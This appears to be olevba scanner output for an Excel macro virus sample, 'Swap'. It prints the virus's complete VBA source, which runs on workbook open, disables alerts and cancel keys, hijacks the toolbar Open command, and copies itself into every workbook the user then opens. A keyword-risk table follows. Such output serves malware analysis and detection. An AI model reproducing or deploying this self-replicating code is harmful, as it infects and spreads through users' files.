olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Swap-eaf293907a0680c8bdc1bf2f73dd94d4f1ac179f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Swap-eaf293907a0680c8bdc1bf2f73dd94d4f1ac179f - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Swap-eaf293907a0680c8bdc1bf2f73dd94d4f1ac179f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Swap-eaf293907a0680c8bdc1bf2f73dd94d4f1ac179f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Swap-eaf293907a0680c8bdc1bf2f73dd94d4f1ac179f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Swap.bas 
in file: Virus.MSExcel.Swap-eaf293907a0680c8bdc1bf2f73dd94d4f1ac179f - OLE stream: '_VBA_PROJECT_CUR/VBA/Swap'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Swap
Private Sub Auto_Open()
On Error Resume Next
Application.EnableEvents = 0
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Application.OnKey "{ESCAPE}", ""
Application.OnKey "^{BREAK}", ""
Application.OnSheetDeactivate = ""
Application.OnSheetActivate = ""
Application.OnSheetActivate = ""
Application.OnAction = ""
Application.OnWindow = ""
Application.OnEntry = ""
Application.OnSave = ""
ι = Environ("WINDIR") & "\ShellNew\Swap.xls"
ThisWorkbook.SaveCopyAs ι
CommandBars("File").Reset
CommandBars("Standard").Reset
CommandBars("File").Controls(2).OnAction = ι & "!ν"
CommandBars("Standard").Controls(2).OnAction = ι & "!ν"
CommandBars("Standard").Protection = 1
CommandBars("File").Protection = 1
End Sub
Private Sub ν()
On Error Resume Next: Windows("Swap.xls").Visible = 0
ThisWorkbook.VBProject.VBComponents("Swap").Export "C:\Swap.Sys"
α = Application.GetOpenFilename
Workbooks.Open α
υ = ActiveWorkbook.Saved
If Not Len(ActiveWorkbook.VBProject.VBComponents("Swap").Name) Then
ActiveWorkbook.VBProject.VBComponents.Import "C:\Swap.Sys"
End If
ActiveWorkbook.Saved = υ
ThisWorkbook.Saved = 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

